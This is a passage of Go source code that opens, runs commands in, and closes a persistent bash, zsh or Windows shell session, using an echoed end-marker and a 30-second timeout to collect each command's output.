	ishellMu   sync.Mutex
	ishellProc *ishellSession
)

const ishellEOC = "__SHLEOF__"

func ishellOpen(shell string) error {
	ishellMu.Lock()
	defer ishellMu.Unlock()

	if ishellProc != nil {
		_ = ishellProc.stdin.Close()
		_ = ishellProc.cmd.Process.Kill()
		_ = ishellProc.cmd.Wait()
		ishellProc = nil
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = makeInteractiveShellCmd(shell)
	} else {
		if shell == "zsh" {
			cmd = exec.Command("zsh", "--norc")
		} else {
			cmd = exec.Command("/bin/bash", "--norc", "--noprofile")
		}
	}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		_ = stdin.Close()
		return err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		_ = stdin.Close()
		return err
	}
	if err := cmd.Start(); err != nil {
		_ = stdin.Close()
		return err
	}

	merged := make(chan string, 4096)
	var wg sync.WaitGroup
	wg.Add(2)
	scanInto := func(r io.Reader) {
		defer wg.Done()
		sc := bufio.NewScanner(r)
		for sc.Scan() {
			merged <- sc.Text()
		}
	}
	go scanInto(stdout)
	go scanInto(stderr)
	go func() {
		wg.Wait()
		close(merged)
	}()

	ishellProc = &ishellSession{cmd: cmd, stdin: stdin, outCh: merged}
	return nil
}

func ishellRun(cmdLine string) (string, error) {
	ishellMu.Lock()
	sess := ishellProc
	ishellMu.Unlock()

	if sess == nil {
		return "", fmt.Errorf("no active shell — use 'ishell open' first")
	}

	marker := fmt.Sprintf("%s_%d", ishellEOC, time.Now().UnixNano())
	var echoLine string
	if runtime.GOOS == "windows" {
		echoLine = "echo " + marker
	} else {
		echoLine = "echo " + marker
	}
	if _, err := fmt.Fprintf(sess.stdin, "%s\n%s\n", cmdLine, echoLine); err != nil {
		return "", err
	}

	var lines []string
	timeout := time.After(30 * time.Second)
	for {
		select {
		case line, ok := <-sess.outCh:
			if !ok {
				return strings.Join(lines, "\n"), fmt.Errorf("shell process exited")
			}
			if strings.Contains(line, marker) {
				return strings.Join(lines, "\n"), nil
			}
			lines = append(lines, line)
		case <-timeout:
			return strings.Join(lines, "\n"), fmt.Errorf("timeout waiting for shell output")
		}
	}
}

func ishellClose() {
	ishellMu.Lock()
	defer ishellMu.Unlock()

	if ishellProc != nil {
		_ = ishellProc.stdin.Close()
		_ = ishellProc.cmd.Process.Kill()
		_ = ishellProc.cmd.Wait()
		ishellProc = nil
	}
}
